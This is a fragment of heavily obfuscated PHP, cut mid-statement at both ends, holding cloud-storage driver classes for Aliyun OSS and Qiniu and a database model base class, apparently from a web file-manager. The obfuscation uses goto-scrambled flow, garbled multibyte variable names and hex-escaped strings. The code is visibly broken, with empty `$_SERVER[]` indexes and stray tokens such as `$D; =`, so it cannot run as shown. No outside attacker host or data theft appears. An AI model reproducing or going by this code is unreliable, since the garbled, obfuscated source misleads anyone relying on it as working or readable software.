$_SERVER[][1317] . $C); $E = $this->link($F, $Cዦ); $this->fileOutLink($E); } public function fileOutImageServer($b, $f񗄲 = 250) { parent::fileOutImage($b, $f񗄲); } public function fileOutLink($Bɞ笥) { $Bզ =& $_SERVER[]; if (!$this->isCdnHost() && substr($Bɞ笥, 0, 7) == $Bզ[1221]) { $Bɞ笥 = $Bզ[1222] . substr($Bɞ笥, 7); } header($Bզ[159] . $Bɞ笥); die; } public function hashMd5($e, $d = '') { $dۃ =& $_SERVER[]; $d痆 = $this->_objectMeta($e); if (!$d痆) { return $dۃ[33]; } if (!isset($d痆[$dۃ[1294]]) && !empty($d)) { $bˮ = $this->updateObjMeta($e, array($dۃ[1294] => $d)); $d痆[$dۃ[1294]] = $bˮ ? $d : $dۃ[33]; } return isset($d痆[$dۃ[1294]]) ? strtolower($d痆[$dۃ[1294]]) : $dۃ[33]; } public function size($a⫈) { $f˽ = $this->objectMeta($a⫈); return $f˽ ? $f˽[$_SERVER[][78]] : 0; } public function info($fȆĐ) { if ($this->isFolder($fȆĐ)) { return $this->folderInfo($fȆĐ); } else { if ($this->isFile($fȆĐ)) { return $this->fileInfo($fȆĐ); } } return !1; } public function exist($fӆ) { return $this->isFile($fӆ) || $this->isFolder($fӆ); } public function isFile($Dȴʮ̣) { return !$this->isFolder($Dȴʮ̣) && $this->objectMeta($Dȴʮ̣); } public function isFolder($cȰ) { return $this->cacheMethod($_SERVER[][199], $cȰ); } protected function objectMeta($fښ) { return $this->cacheMethod($_SERVER[][200], $fښ); } protected function _objectMeta($e) { $DǛ =& $_SERVER[]; try { $d = $this->client->getObjectMeta($this->bucket, $this->pathEncode($e)); } catch (OSS\Core\OssException $E̎) { $d = !1; } if ($d) { $d[$DǛ[78]] = intval($d[$DǛ[1292]]); } return $d; } protected function _isFolder($D) { $e֓ =& $_SERVER[]; if ($D == $e֓[33] || $D == $e֓[8]) { return !0; } $FØ = array($e֓[1288] => $e֓[8], $e֓[1289] => rtrim($D, $e֓[8]) . $e֓[8], $e֓[1290] => 1, $e֓[1291] => $e֓[33]); $f̠ = $this->client->listObjects($this->bucket, $FØ); if ($f̠->getObjectList() || $f̠->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($C) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1318]; $this->_init($C); } public function _init($dԑ) { goto aۂ; B桤: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto AÃɐ; eꎺ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto B桤; aۂ: $c =& $_SERVER[]; foreach ($dԑ as $F => $D) { if (isset($this->{$F})) { $this->{$F} = $D; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($c[1319] . LNG($c[1279])); } goto eꎺ; AÃɐ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($D, $bʊ = '', $Eӳ = REPEAT_RENAME) { if ($this->setContent($D, $bʊ)) { return $this->getPathOuter($D); } return !1; } public function mkdir($BꙔ, $b = REPEAT_SKIP) { goto aݨ; B»: if (!$this->mkfile($Eę)) { return !1; } if (!$this->moveFile($Eę, $BꙔ)) { $this->delFile($Eę); return !1; } return $this->getPathOuter($a㵗); goto eʱ; aݨ: $a颂 =& $_SERVER[]; $a㵗 = trim($BꙔ, $a颂[8]); if ($this->_isFolder($a㵗)) { return $this->getPathOuter($a㵗); } goto d; d: $BꙔ = $a㵗 . $a颂[8]; $f = get_path_this($a㵗); $Eę = $BꙔ . $f; goto B»; eʱ: } public function copyFile($f, $BѮڼ) { $b = $this->bucketManager->copy($this->bucket, $f, $this->bucket, $BѮڼ, !0); return $b ? !1 : $this->getPathOuter($BѮڼ); } public function moveFile($bݧ܇, $C) { $Eݧ = $this->bucketManager->move($this->bucket, $bݧ܇, $this->bucket, $C, !0); return $Eݧ ? !1 : $this->getPathOuter($C); } public function delFile($cÝ੽) { if (!$this->exist($cÝ੽)) { return !0; } $aޫ = $this->bucketManager->delete($this->bucket, $cÝ੽); return $aޫ ? !1 : !0; } public function delFolder($F) { goto e; A: $c = $this->fileList($F); $this->listItemCache = !0; $F͸ = trim($F, $b˂[8]) . $b˂[8]; goto c㖌; e: $b˂ =& $_SERVER[]; if (!$this->exist($F)) { return !0; } $this->listItemCache = !1; goto A; c㖌: if (!empty($F) && $F !== $b˂[191] && !in_array($F͸, $c[$b˂[75]])) { $c[$b˂[75]][] = $F͸; } $Bؿ = $this->delByBatch($c[$b˂[74]]); if (!$Bؿ) { return !1; } goto b; b: $Bؿ = $this->delByBatch($c[$b˂[75]]); if (!$Bؿ) { return !1; } return $this->delFile($F͸); goto e; e: } private function delByBatch($Eھ) { foreach (array_chunk($Eھ, 1000) as $dܟ) { $Eܪ = $this->bucketManager->buildBatchDelete($this->bucket, $dܟ); list($BȘ, $cК˧) = $this->bucketManager->batch($Eܪ); if ($cК˧) { return !1; } } return !0; } public function rename($A⮑, $B) { return $this->renameObject($A⮑, $B); } public function fileInfo($c, $b = false, $f̶ = array()) { goto dɜ; dɜ: $c΋Ƀ =& $_SERVER[]; $eֳ = array($c΋Ƀ[28] => $this->pathThis($c), $c΋Ƀ[76] => $this->getPathOuter($c΋Ƀ[8] . $c), $c΋Ƀ[29] => $c΋Ƀ[193], $c΋Ƀ[78] => isset($f̶[$c΋Ƀ[1320]]) ? $f̶[$c΋Ƀ[1320]] : 0, $c΋Ƀ[168] => $this->ext($c)); if ($b) { return $eֳ; } goto D; Bй: if (isset($f̶[$c΋Ƀ[1321]])) { $eֳ[$c΋Ƀ[84]] = substr($f̶[$c΋Ƀ[1321]] . $c΋Ƀ[33], 0, 10); } if (isset($f̶[$c΋Ƀ[1320]])) { $eֳ[$c΋Ƀ[78]] = $f̶[$c΋Ƀ[1320]]; } return $eֳ; goto bՅ; D: $eֳ[$c΋Ƀ[194]] = $eֳ[$c΋Ƀ[84]] = 0; $eֳ[$c΋Ƀ[195]] = $eֳ[$c΋Ƀ[196]] = !0; if (empty($f̶)) { $f̶ = $this->objectMeta($c); if (!$f̶) { return $eֳ; } } goto Bй; bՅ: } public function folderInfo($a̰Ӆ, $e񷜑߂ = false) { goto dۚ; dۚ: $dΓ =& $_SERVER[]; $d眍 = array($dΓ[28] => $this->pathThis($a̰Ӆ), $dΓ[76] => $this->getPathOuter($dΓ[8] . $a̰Ӆ), $dΓ[29] => $dΓ[77]); if ($e񷜑߂) { return $d眍; } goto f; D: $a癏ծ = $this->objectMeta($a̰Ӆ); if (isset($a癏ծ[$dΓ[1321]])) { $d眍[$dΓ[84]] = substr($a癏ծ[$dΓ[1321]] . $dΓ[33], 0, 10); } return $d眍; goto cߙ; f: $d眍[$dΓ[194]] = $d眍[$dΓ[84]] = 0; $d眍[$dΓ[195]] = $d眍[$dΓ[196]] = !0; $a̰Ӆ = rtrim($a̰Ӆ, $dΓ[8]) . $dΓ[8]; goto D; cߙ: } public function listPath($dı, $f̟ = false) { $e =& $_SERVER[]; $b = $this->fileList($dı, $e[8], !0); foreach ($b[$e[75]] as $Bؓ => $CƤ) { $b[$e[75]][$Bؓ] = $this->folderInfo($CƤ, $f̟); } foreach ($b[$e[74]] as $Bؓ => $CƤ) { $b[$e[74]][$Bؓ] = $this->fileInfo($CƤ[$e[93]], $f̟, $CƤ); } return $b; } public function has($A, $Důȟم = false, $Cᙆ¿ = true) { goto fރЋ; e: $EǢ᱾ = $eɐ = 0; while (!0) { check_abort(); list($c, $aϺ) = $this->bucketManager->listFiles($this->bucket, $d㟽, $F錔, $B¬, $f); if ($aϺ) { break; } $F錔 = array_key_exists($EӅ[1291], $c) ? $F錔 = $c[$EӅ[1322]] : $EӅ[33]; if ($Důȟم) { if (!empty($c[$EӅ[1323]])) { $EǢ᱾ += count($c[$EӅ[1323]]); } if (!empty($c[$EӅ[1324]])) { $eɐ += count($c[$EӅ[1324]]); } if ($F錔 === $EӅ[33]) { break; } continue; } if ($Cᙆ¿) { if (!empty($c[$EӅ[1323]])) { return !0; } } else { if (!empty($c[$EӅ[1324]])) { return !0; } } if ($F錔 === $EӅ[33]) { break; } } if ($Důȟم) { return array($EӅ[203] => $EǢ᱾, $EӅ[204] => $eɐ); } goto Eލ; B: $F錔 = $EӅ[33]; $B¬ = 500; $f = $EӅ[8]; goto e; fރЋ: $EӅ =& $_SERVER[]; $A = trim($A, $EӅ[8]); $d㟽 = empty($A) && $A !== $EӅ[191] ? $EӅ[33] : $A . $EӅ[8]; goto B; Eލ: return !1; goto d˃; d˃: } public function listAll($EЋߎ) { $A젘 =& $_SERVER[]; $B = $this->fileList($EЋߎ, $A젘[33], !0); $b = array(); foreach ($B[$A젘[74]] as $F) { $b[$F[$A젘[93]]] = $F[$A젘[78]]; } foreach ($B[$A젘[75]] as $F) { if (is_string($F)) { $b[$F] = 0; } } return $this->listAllFiles($EЋߎ, array_keys($b), $b); } private function fileList($aیғ, $A͉ = '', $cݭ = 0) { goto cř; cř: $Eևͽ =& $_SERVER[]; $aیғ = trim($aیғ, $Eևͽ[8]); $fŠ = empty($aیғ) && $aیғ !== $Eևͽ[191] ? $Eևͽ[33] : $aیғ . $Eևͽ[8]; goto cͯ; f: $A𣣆 = $c = array(); while (!0) { check_abort(); list($E덚, $Bߕ) = $this->bucketManager->listFiles($this->bucket, $fŠ, $C챏, $b, $A͉); if ($Bߕ) { break; } $C챏 = array_key_exists($Eևͽ[1291], $E덚) ? $C챏 = $E덚[$Eևͽ[1322]] : $Eևͽ[33]; $C = isset($E덚[$Eևͽ[1323]]) ? $E덚[$Eևͽ[1323]] : array(); $bŋ = isset($E덚[$Eևͽ[1324]]) ? $E덚[$Eևͽ[1324]] : array(); foreach ($C as $e惴) { goto dϩ; Aϕ: $e惴[$Eևͽ[78]] = $Aޘ; $cȓ = $Aޘ == 0 && substr($Bܗ, strlen($Bܗ) - 1, 1) == $Eևͽ[8] ? !0 : !1; if ($cκг) { $this->cacheMethod($Eևͽ[199], $Bܗ, $cȓ); $this->cacheMethod($Eևͽ[200], $Bܗ, $e惴); } goto a۴; a۴: if ($cȓ) { $A𣣆[] = $Bܗ; continue; } $c[] = $cݭ ? $e惴 : $Bܗ; goto Cۯ; dϩ: if ($e惴[$Eևͽ[93]] == $fŠ) { continue; } $Bܗ = $e惴[$Eևͽ[93]]; $Aޘ = $e惴[$Eևͽ[1320]]; goto Aϕ; Cۯ: } foreach ($bŋ as $Bܗ) { if ($Bܗ == $fŠ) { continue; } $A𣣆[] = $Bܗ; if ($cκг) { $this->cacheMethod($Eևͽ[199], $Bܗ, !0); } } if ($C챏 === $Eևͽ[33]) { break; } } if ($cκг) { $this->cacheMethod($Eևͽ[199], $aیғ, !0); } goto DܨѤ; cͯ: $C챏 = $Eևͽ[33]; $b = 1000; $cκг = $this->listItemCache === !1 ? !1 : !0; goto f; DܨѤ: return array($Eևͽ[75] => $A𣣆, $Eևͽ[74] => $c); goto fʫ; fʫ: } public function canRead($F) { return $this->exist($F) ? !0 : !1; } public function canWrite($e̍) { return $this->exist($e̍) ? !0 : !1; } public function getContent($bʱ) { return $this->fileSubstr($bʱ, 0, -1); } public function setContent($a劘Ž, $D݋ = '') { $E剕 = $this->tempFile($this->pathThis($a劘Ž)); file_put_contents($E剕, $D݋); if ($this->upload($a劘Ž, $E剕)) { $this->tempFileRemve($E剕); return !0; } return !1; } public function refreshUrls($B诚ƃ) { goto a; a: $b͹ =& $_SERVER[]; $a൷ = array(); if (is_array($B诚ƃ)) { foreach ($B诚ƃ as $Cġ) { $a൷[] = $this->link($Cġ); } } else { $a൷[] = $this->link($B诚ƃ); } goto Fڊ; Fڊ: $f = new Qiniu\Cdn\CdnManager($this->auth); list($fɠ, $A󩜋) = $f->refreshUrls($a൷); if ($A󩜋) { return !1; } goto bƝ; bƝ: return $fɠ[$b͹[1095]] == $b͹[737] ? !0 : !1; goto Fֽ; Fֽ: } public function fileSubstr($d枊, $fȈ, $f༔󐔛) { $F»͆Ц =& $_SERVER[]; if (!($e = $this->link($d枊))) { return !1; } $E͐ = !1; if ($f༔󐔛 > 0) { $Cʹ = $fȈ + $f༔󐔛 - 1; $E͐ = array($F»͆Ц[1325] . $fȈ . $F»͆Ц[454] . $Cʹ); } $F􂙾 = url_request($e, $F»͆Ц[228], !1, $E͐); return $F􂙾[$F»͆Ц[727]] ? $F􂙾[$F»͆Ц[1105]] : !1; } public function upload($AƢޯ, $cƽ, $cᇐ = false, $Eߛ = REPEAT_REPLACE) { $e = new Qiniu\Storage\UploadManager(); $Aݢ = $this->auth->uploadToken($this->bucket, $AƢޯ); $D; = get_file_mime(get_path_ext($cƽ)); list($dֵ, $eܭ) = $e->putFile($Aݢ, $AƢޯ, $cƽ, null, $D;); return $eܭ ? !1 : $this->getPathOuter($AƢޯ); } public function uploadFormData($fЊ, $B = 3600) { return $this->uploadToken($fЊ, $B); } public function multiUploadFormData($CΊ҃, $bб = 3600) { return $this->uploadToken($CΊ҃, $bб); } private function uploadToken($a䌉, $f = 3600) { goto aܢ; a냠: $d = http_type() . "\x3a\x2f\x2f\x75\160\x6c\157\x61\x64{$F㎥}\x2e\x71\x69\156\x69\165\x70\x2e\143\157\x6d\57"; return array($dϢ쩄[1329] => $EƗ, $dϢ쩄[1330] => $d); goto Fւ; aܢ: $dϢ쩄 =& $_SERVER[]; $f܍ן = $f; $c = array($dϢ쩄[1326] => $dϢ쩄[1327]); goto c٬嬤; c٬嬤: $e픎 = $a䌉; $EƗ = $this->auth->uploadToken($this->bucket, $e픎, $f܍ן, $c, !0); $F㎥ = empty($this->region) || $this->region == $dϢ쩄[1328] ? $dϢ쩄[33] : $dϢ쩄[454] . $this->region; goto a냠; Fւ: } public function download($Cخ, $eڌ) { goto cϒ; Č: fclose($bꎕ); return $eڌ; goto a; E: $bڜ = 1024 * 200; $bꎕ = fopen($F޿谛, $_SERVER[][1331]); while (!0) { $A = $this->fileSubstr($Cخ, $Aԓ, $bڜ); if ($A === !1) { return !1; } fwrite($bꎕ, $A); $Aԓ += $bڜ; if (strlen($A) < $bڜ) { break; } } goto Č; cϒ: $F޿谛 = IO::getPathInner(IO::mkfile($eڌ)); if (!($CƦ׾ = $this->link($Cخ))) { return !1; } $Aԓ = 0; goto E; a: } public function link($c՗ȭ, $f뗕 = '') { if (!$this->isFile($c՗ȭ)) { return !1; } $a۲ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($c՗ȭ) . $f뗕; return $this->auth->privateDownloadUrl($a۲, 3600 * 12); } public function fileOut($C؎, $F = false, $Bѕ = false, $b줷٠ = '') { $fؘ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($C؎, $F, $Bѕ, $b줷٠); } if (!$Bѕ) { $Bѕ = $this->pathThis($C؎); } $FԎ۳ = $F ? $fؘ[1332] . rawurlencode($Bѕ) : $fؘ[33]; $Eӈ = $this->link($C؎, $FԎ۳); $this->fileOutLink($Eӈ); } public function fileOutServer($bٝ, $e䵏ڮ = false, $eǨؒ = false, $F湔ɗ = '') { parent::fileOut($bٝ, $e䵏ڮ, $eǨؒ, $F湔ɗ); } public function fileOutImage($f뿈, $fͩ = 250) { $b = $this->link($f뿈, $_SERVER[][1333] . $fͩ); $this->fileOutLink($b); } public function fileOutImageServer($Dȿ, $b✾ٸ = 250) { parent::fileOutImage($Dȿ, $b✾ٸ); } public function hashMd5($FҚ) { $e˄ =& $_SERVER[]; $e = $this->objectMeta($FҚ); return isset($e[$e˄[208]]) ? $e[$e˄[208]] : !1; $FӋ˷ = $this->link($FҚ, $e˄[1334]); } public function size($BƴĜ) { $bڹ = $this->objectMeta($BƴĜ); return $bڹ ? $bڹ[$_SERVER[][78]] : 0; } public function info($A粦) { if ($this->isFolder($A粦)) { return $this->folderInfo($A粦); } else { if ($this->isFile($A粦)) { return $this->fileInfo($A粦); } } return !1; } public function exist($FĿƔ) { return $this->isFile($FĿƔ) || $this->isFolder($FĿƔ); } public function isFile($f跛) { return !$this->isFolder($f跛) && $this->objectMeta($f跛); } public function isFolder($d߼) { return $this->cacheMethod($_SERVER[][199], $d߼); } protected function objectMeta($bί) { return $this->cacheMethod($_SERVER[][200], $bί); } protected function _objectMeta($cÍ) { $d׬ɝ =& $_SERVER[]; list($b濳, $BϷ) = $this->bucketManager->stat($this->bucket, $cÍ); if ($b濳) { $b濳[$d׬ɝ[78]] = intval($b濳[$d׬ɝ[1320]]); } return $b濳; } protected function _isFolder($d؊) { $B؊ =& $_SERVER[]; if ($d؊ == $B؊[33] || $d؊ == $B؊[8]) { return !0; } list($b, $Bլ) = $this->bucketManager->listFiles($this->bucket, trim($d؊, $B؊[8]) . $B؊[8], $B؊[33], 1, $B؊[8]); return !empty($b[$B؊[1323]]) || !empty($b[$B؊[1324]]) ? !0 : !1; } } goto D; e: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\171\124\x69\155\145", "\x74\151\155\145", "\x69\156\163\145\162\164\54\165\x70\144\x61\164\145", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\143\162\x65\x61\x74\x65\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\156\x73\x65\162\164", "\146\x75\156\143\x74\x69\157\156")); public function setDataAuto($D) { $this->dataAuto = $D; } public function __construct($cמ = '', $FӇ = '', $C␴ = '') { parent::__construct($cמ, $FӇ, $C␴); } protected $tableMeta = array(); protected function _beforeInsert(&$cԓ鰌, $cӨ) { $aӢ =& $_SERVER[]; if (!$this->checkDataAutoHas($aӢ[353])) { return; } $this->dataBeforeFilter($cԓ鰌, $aӢ[353]); } protected function _beforeUpdate(&$cԄ䧠, $Bҷ) { $e׷ =& $_SERVER[]; if (!$this->checkDataAutoHas($e׷[354])) { return; } $this->dataBeforeFilter($cԄ䧠, $e׷[354]); } protected function _afterSelect(&$bϽ, $F߳) { if (!is_array($bϽ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } foreach ($bϽ as &$e) { $this->dataAfterFilter($e); } unset($e); } protected function _afterFind(&$eÄԗ, $dȆ) { if (!is_array($eÄԗ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } $this->dataAfterFilter($eÄԗ); } public static function textEncode($CɃ) { if (!$CɃ) { return $CɃ; } $dг = json_encode($CɃ); $dг = preg_replace_callback($_SERVER[][356], function ($A˽) { return addslashes($A˽[0]); }, $dг); return json_decode($dг); } public static function textDecode($Dە) { $e®ᕝ =& $_SERVER[]; $Aُ = json_encode($Dە); $Aُ = preg_replace_callback($e®ᕝ[357], function ($A°ߚ) { return $_SERVER[][97]; }, $Aُ); return json_decode($Aُ); } public function setAutoIncrement($Ĕ̕) { $C = array($this->getPk() => $Ĕ̕); $D䲭 = $this->data($C)->add(); if ($D䲭) { $this->delete($D䲭); } } public function getAutoIncrement() { $F = $this->getTableName(); $aۺ = $this->max($this->getPk()); $F = $this->query("\163\150\x6f\167\x20\164\141\142\x6c\x65\x20\163\x74\x61\164\x75\163\x20\167\x68\145\162\145\x20\116\x61\155\145\75\x27{$F}\x27"); $Aܖ = $F[0][$_SERVER[][358]]; $a = max($aۺ, $Aܖ); return $a; } protected function _callBefore($Fᘅ, $e±م) { return $this->cacheCallCheck($Fᘅ, $e±م, !1); } protected function _callAfter($Fۺ, $aŲ՘) { return $this->cacheCallCheck($Fۺ, $aŲ՘, !0); } protected function cacheFunctionAlias($D) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($f, $D⩑, $AК = false) { $aΉ = $this->cacheFunctionAlias($D⩑); if (!$aΉ) { return; } foreach ($aΉ as $Fԑ => $EѴ) { $E = $EѴ[0]; $C = explode($_SERVER[][47], $EѴ[1]); if ($f == $Fԑ) { return $this->cacheFunctionGet($Fԑ, $E); } if ($AК && in_array($f, $C)) { $this->cacheFunctionClear($Fԑ, $E); } } } public function cacheFunctionGet($E܏Ȱ, $dƄ) { $E = $this->cacheKeyMake($E܏Ȱ, $dƄ); $F֤ = Cache::get($E); if (!is_array($F֤)) { $F֤ = call_user_func_array(array($this, $E܏Ȱ), array($dƄ, !0)); Cache::set($E, $F֤); } return $F֤; } public function cacheFunctionClear($B˶, $d덹) { $c = $d덹; if (!is_array($d덹)) { $c = array($d덹); } foreach ($c as $a̳ɾ) { $Dɭҩ = $this->cacheKeyMake($B˶, $a̳ɾ); Cache::remove($Dɭҩ); } } private function cacheKeyMake($bࢄ, $Fͅ) { $aɽ =& $_SERVER[]; return get_class($this) . $aɽ[71] . $bࢄ . $aɽ[359] . $Fͅ; } protected function selectPageReset() { $E =& $_SERVER[]; if (isset($GLOBALS[$E[360]])) { return; } $GLOBALS[$E[360]] = isset($GLOBALS[$E[7]][$E[361]]) ? $GLOBALS[$E[7]][$E[361]] : !1; $GLOBALS[$E[362]] = isset($GLOBALS[$E[7]][$E[351]]) ? $GLOBALS[$E[7]][$E[351]] : !1; $GLOBALS[$E[7]][$E[361]] = !1; $GLOBALS[$E[7]][$E[351]] = !1; } protected function selectPageRestore() { $Bʆ =& $_SERVER[]; if (!isset($GLOBALS[$Bʆ[360]])) { return; } $GLOBALS[$Bʆ[7]][$Bʆ[361]] = $GLOBALS[$Bʆ[360]]; $GLOBALS[$Bʆ[7]][$Bʆ[351]] = $GLOBALS[$Bʆ[362]]; unset($GLOBALS[$Bʆ[360]]); unset($GLOBALS[$Bʆ[362]]); } protected function selectPage($fӂ = 200, $d = 1) { goto eظ; f: $CЭǟ = 50000; $fӂ = isset($in[$B[361]]) && $in[$B[361]] ? $in[$B[361]] : $fӂ; if ($fӂ === -1) { $in[$B[361]] = !1; $CЭǟ = 100000000; $fӂ = $CЭǟ; } goto d܏; D: if (!is_array($e)) { $e = array(); } if ($b == 1) { $cۄҩ = count($e); } $B󕪎 = array($B[364] => array($B[365] => $cۄҩ, $B[361] => $fӂ, $B[351] => $d, $B[366] => $b), $B[367] => $e); goto A쌈; E軄: $e = array(); $cмƌ = 1; if ($d == 1 && $cмƌ) { $this->optionsValue($d칪); $e = $this->page($d, $fӂ)->select(); $cۄҩ = is_array($e) ? count($e) : 0; if ($cۄҩ < $fӂ) { $b = 1; } else { $this->optionsValue($D); $cۄҩ = intval($this->count()); $b = ceil($cۄҩ / $fӂ); } } else { $this->optionsValue($D); $cۄҩ = intval($this->count()); $b = ceil($cۄҩ / $fӂ); $d = $d >= $b ? $b : $d; $this->optionsValue($d칪); $e = $this->page($d, $fӂ)->select(); } goto D; d܏: $D = $d칪; $D[$B[363]] = array(); $fӂ = intval($fӂ); goto bԓ; A쌈: return $B󕪎; goto Aˌ; bԓ: $fӂ = $fӂ <= 5 ? 5 : ($fӂ >= $CЭǟ ? $CЭǟ : $fӂ); $d = intval(isset($in[$B[351]]) && $in[$B[351]] ? $in[$B[351]] : $d); $d = $d <= 1 ? 1 : $d; goto E軄; eظ: $B =& $_SERVER[]; global $in; $d칪 = $this->optionsValue(); goto f; Aˌ: } protected function checkLength($DЛ, $B = 0, $Aڑ = '') { $f劲 =& $_SERVER[]; $B = $B ? $B : 65536; if (!$DЛ || strlen($DЛ) < $B) { return; } $Aڑ = $Aڑ ? $Aڑ . $f劲[68] : $f劲[33]; show_json($Aڑ . LNG($f劲[368]) . "\x28{$B}\x29", !1); } protected function metaSet($aĨ, $A͸ = null, $EĦڳ = null) { goto d; d: $C =& $_SERVER[]; if (!$this->tableMeta || !$aĨ) { return !1; } $Cӭ = $this->tableMeta[$C[369]]; goto b˰; fҤ: CacheLock::unlock($cϳ); return !0; goto b; C: $cϳ = $C[373] . $this->tableMeta; CacheLock::lock($cϳ); $f̬->where(array($Cӭ => $aĨ))->addAll($A܋, array(), !0); goto fҤ; b˰: $BП = $this->tableMeta[$C[370]]; $f̬ = Model($BП); $c = array($Cӭ => $aĨ, $C[371] => $A͸); goto D; dڛ䦐: if (is_string($A͸)) { $c[$A͸] = $EĦڳ; } $A܋ = array(); foreach ($c as $d => $B䙇) { if (is_null($B䙇) && is_string($d)) { $f̬->where(array($Cӭ => $aĨ, $C[371] => $d))->delete(); continue; } $this->checkLength($B䙇, !1, $BП . $C[4] . $d); $A܋[] = array($Cӭ => $aĨ, $C[93] => $d, $C[372] => $B䙇); } goto C; D: if (is_null($A͸)) { return $f̬->where(array($Cӭ => $aĨ))->delete(); } if (is_null($EĦڳ) && is_string($A͸)) { return $f̬->where($c)->delete(); } $c = is_array($A͸) ? $A͸ : array(); goto dڛ䦐; b: } public function metaGet($DÄ, $D = false) { goto D; BՈ: $Eپ֋ = Model($this->tableMeta[$E׸[370]]); if ($D) { $e = array($Cǥƴ => $DÄ, $E׸[93] => $D); return $Eپ֋->where($e)->getField($E׸[372]); } $e = array($Cǥƴ => $DÄ); goto e۾ގ; e۾ގ: $AÂ = $Eپ֋->field($E׸[374])->where($e)->select(); $AÂ = array_to_keyvalue($AÂ, $E׸[93], $E׸[372]); return $AÂ; goto DȻá; D: $E׸ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $Cǥƴ = $this->tableMeta[$E׸[369]]; goto BՈ; DȻá: } private function checkDataAutoHas($cǨ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $c׎݈) { if (in_array($cǨ, explode($_SERVER[][47], $c׎݈[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eȢ, $Dʣ) { $AӪ =& $_SERVER[]; foreach ($this->dataAuto as $a᫧) { $Eھ = $a᫧[0]; if (!in_array($Dʣ, explode($AӪ[47], $a᫧[2]))) { continue; } switch (trim($a᫧[3])) { case $AӪ[319]: case $AӪ[320]: $că = $a᫧[1]; $Bɹ֘ = isset($a᫧[4]) ? (array) $a᫧[4] : array(); if ($că == $AӪ[197] && array_key_exists($Eھ, $eȢ)) { if (!$eȢ[$Eھ]) { unset($eȢ[$Eھ]); } break; } if (isset($eȢ[$Eھ])) { array_unshift($Bɹ֘, $eȢ[$Eھ]); } if ($AӪ[319] == $a᫧[3]) { $eȢ[$Eھ] = call_user_func_array($că, $Bɹ֘); } else { $eȢ[$Eھ] = call_user_func_array(array(&$this, $că), $Bɹ֘); } break; case $AӪ[268]: if (isset($eȢ[$Eھ]) && $eȢ[$Eھ]) { $eȢ[$Eھ] = call_user_func_array(array(&$this, $a᫧[1]), array($eȢ[$Eھ])); } break; case $AӪ[271]: $eȢ[$Eھ] = $eȢ[$a᫧[1]]; break; case $AӪ[292]: if (isset($eȢ[$Eھ]) && !is_string($eȢ[$Eھ])) { $eȢ[$Eھ] = json_encode_force($eȢ[$Eھ]); } break; case $AӪ[321]: if ($eȢ[$Eھ] === $AӪ[33]) { unset($eȢ[$Eھ]); } break; case $AӪ[322]: $eȢ[$Eھ] = $a᫧[1]; default: break; } } if ($Dʣ == $AӪ[353]) { $dϑƃ = strtolower($this->db->getDbType()); if (strpos($dϑƃ, $AӪ[9]) !== 0) { return; } $Cȷ = $this->field(!0)->fields; $C࿧ = $Cȷ[$AӪ[250]]; if (isset($Cȷ[$AӪ[249]])) { unset($C࿧[$Cȷ[$AӪ[249]]]); } foreach ($C࿧ as $E => $Dʣ) { if (!isset($eȢ[$E])) { $eȢ[$E] = $AӪ[33]; } } } } private function dataAfterFilter(&$C) { $A（ =& $_SERVER[]; foreach ($this->dataAuto as $b􌠭˓) { $B퓆 = $b􌠭˓[0]; if (!isset($C[$B퓆])) { continue; } if (!in_array($A（[355], explode($A（[47], $b􌠭˓[2]))) { continue; } switch (trim($b􌠭˓[3])) { case $A（[319]: case $A（[320]: $a = isset($b􌠭˓[4]) ? (array) $b􌠭˓[4] : array(); array_unshift($a, $C[$B퓆]); if (isset($b􌠭˓[4]) && $b􌠭˓[4] == $A（[375]) { $a = array($C[$B퓆]); } if ($A（[319] == $b􌠭˓[3]) { $C[$B퓆] = call_user_func_array($b􌠭˓[1], $a); } else { $C[$B퓆] = call_user_func_array(array(&$this, $b􌠭˓[1]), $a); } break; case $A（[268]: if (isset($C[$B퓆]) && $C[$B퓆]) { $C[$B퓆] = call_user_func_array(array(&$this, $b􌠭˓[1]), array($C[$B퓆])); } break; case $A（[271]: $C[$B퓆] = $C[$b􌠭˓[1]]; break; case $A（[292]: $E؜눦Ҝ = $C[$B퓆]; $C[$B퓆] = json_decode($E؜눦Ҝ, !0); if (is_null($C[$B퓆])) { $C[$B퓆] = $E؜눦Ҝ; } break; case $A（[321]: if ($C[$B퓆] === $A（[33]) { unset($C[$B퓆]); } break; case $A（[322]: $C[$B퓆] = $b􌠭˓[1]; break; default: break; } } } public function saveAll($bȐô) { goto b; CڞϢ: $this->chunkEventSet(); goto d§; AԂĜ: $Fɿ = array(); $eݓ = count($bȐô); for ($eӱƳ = 0; $eӱƳ < $eݓ; $eӱƳ++) { $Fγ = $bȐô[$eӱƳ]; if (!is_array($Fγ) || count($Fγ) != 4) { continue; } $a¬ = "\x55\120\x44\101\124\105\40\140{$B˿}\x60\40\x53\105\124\40{$Fγ[2]}\x20\x3d\x20\x43\101\x53\x45\x20{$Fγ[0]}\40\xa"; if ($d푸 == 0) { $eÖҘ = $a¬; } $Fɿ[] = $C[116] . $Fγ[1] . $C[116]; $d푸++; $eÖҘ .= "\40\127\x48\x45\x4e\40\47{$Fγ[1]}\x27\x20\x54\110\x45\x4e\40\47{$Fγ[3]}\x27\40\12"; if ($d푸 == $bև || $eӱƳ == $eݓ - 1) { goto d; d: $E = implode($C[47], 